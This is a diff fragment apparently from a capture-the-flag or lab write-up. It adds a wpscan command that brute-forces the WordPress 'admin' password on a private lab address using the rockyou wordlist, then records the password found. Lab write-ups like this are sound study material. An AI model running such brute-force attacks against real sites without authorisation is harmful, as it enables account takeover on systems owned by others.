@@ -104,10 +104,13 @@ it found no plugin but found user `admin`.
 
 i tried different things but at last i just brute forced the admin user with wpscan to find the password :
 
-```bash
+put user `admin` into user.txt
 
+```bash
+wpscan --url http://192.168.127.252/1010101/wordpress/ -U user.txt -P /usr/share/wordlists/rockyou.txt
 ```
 
+- found the password : Password@123 
 
 
 
